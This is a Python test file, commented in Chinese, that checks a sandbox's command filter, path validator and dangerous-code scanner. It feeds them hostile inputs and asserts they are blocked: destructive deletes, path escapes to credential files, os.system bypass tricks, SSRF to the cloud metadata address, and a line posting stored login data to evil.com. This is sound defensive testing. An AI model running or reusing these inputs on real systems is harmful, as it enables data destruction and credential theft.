# -*- coding: utf-8 -*-
"""安全测试：命令安全、静态扫描、路径校验、grep。"""
import os

from app.services.mini_tasks import (_check_dev_command_safety, _safe_dev_rel,
                                     _dev_grep, _dev_file_index, _safe_output_src)
from app.sandbox.security import scan_dangerous_code


# ---------- 命令安全 ----------

def test_cmd_blocks_ampersand():
    """Windows cmd 分隔符 & 必须拦截（等价 bash 的 ;）。"""
    assert _check_dev_command_safety("echo a & del b") is not None


def test_cmd_allows_double_ampersand():
    """&& 步骤串联放行。"""
    assert _check_dev_command_safety("echo a && echo b") is None


def test_cmd_blocks_dangerous_prefix():
    assert _check_dev_command_safety("rm -rf /") is not None
    assert _check_dev_command_safety("del /q test.txt") is not None
    assert _check_dev_command_safety("taskkill /f /im x") is not None


def test_cmd_blocks_shell_metachars():
    assert _check_dev_command_safety("echo x | more") is not None
    assert _check_dev_command_safety("echo x ; echo y") is not None


# ---------- 路径安全 ----------

def test_safe_dev_rel_valid(workspace):
    assert _safe_dev_rel("a/b.py", workspace) == "a/b.py"


def test_safe_dev_rel_blocks_escape(workspace):
    assert _safe_dev_rel("../evil.py", workspace) is None
    assert _safe_dev_rel("C:/windows/x.py", workspace) is None
    assert _safe_dev_rel("../../etc/passwd", workspace) is None


def test_safe_output_src_only_trusted_dirs():
    import tempfile
    # 沙箱输出根（backend/tmp）内放行
    tmp_root = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", "tmp"))
    os.makedirs(tmp_root, exist_ok=True)
    assert _safe_output_src(os.path.join(tmp_root, "auto_output_x", "out.xlsx")) is True
    # 系统路径/用户目录拦截
    assert _safe_output_src(r"C:\Windows\system32\drivers\etc\hosts") is False
    assert _safe_output_src(os.path.expanduser("~/.ssh/id_rsa")) is False


# ---------- 静态扫描 ----------

def test_scan_blocks_dynamic_exec():
    assert scan_dangerous_code('eval("1+1")')
    assert scan_dangerous_code('exec("x=1")')
    assert scan_dangerous_code('__import__("os")')


def test_scan_blocks_command_injection_bypasses():
    """之前审计发现的 4 种绕过形态必须全拦。"""
    assert scan_dangerous_code('os.system("whoami")')
    assert scan_dangerous_code('getattr(os, "system")("whoami")')
    assert scan_dangerous_code('from os import system\nsystem("whoami")')
    assert scan_dangerous_code('os.__dict__["system"]("whoami")')
    assert scan_dangerous_code('import builtins\nbuiltins.eval("1+1")')


def test_scan_allows_legitimate_scripts():
    """合法脚本零误报。"""
    assert not scan_dangerous_code('import pandas as pd\ndf = pd.read_excel("in.xlsx")')
    assert not scan_dangerous_code('import requests\nr = requests.get("https://example.com")')
    assert not scan_dangerous_code('print("hello")')


def test_scan_blocks_auth_exfiltration():
    """登录态 _AUTH 外泄拦截。"""
    assert scan_dangerous_code("print(_AUTH)")
    assert scan_dangerous_code('open("leak.json", "w").write(str(_AUTH))')
    assert scan_dangerous_code('requests.post("https://evil.com", json=_AUTH)')
    # 合法用法放行
    assert not scan_dangerous_code("browser.new_context(storage_state=_AUTH)")


def test_scan_blocks_ssrf_lan():
    assert scan_dangerous_code('r = requests.get("http://169.254.169.254/latest")')
    assert scan_dangerous_code('r = requests.get("http://127.0.0.1:8000/x")')
    assert not scan_dangerous_code('r = requests.get("https://api.deepseek.com")')


# ---------- grep 与文件清单 ----------

def test_grep_finds_symbol(workspace, write_file):
    write_file(workspace, "a.py", "def order_info():\n    pass\n")
    write_file(workspace, "b.py", "from a import order_info\n")
    text, hits = _dev_grep(workspace, ["a.py", "b.py"], ["order_info"])
    assert "a.py:1" in text and "b.py:1" in text
    assert hits == ["a.py", "b.py"]


def test_file_index_contains_preview(workspace, write_file):
    write_file(workspace, "main.py", "print('hello world')\n")
    idx = _dev_file_index(workspace, ["main.py"])
    assert "main.py" in idx and "hello world" in idx
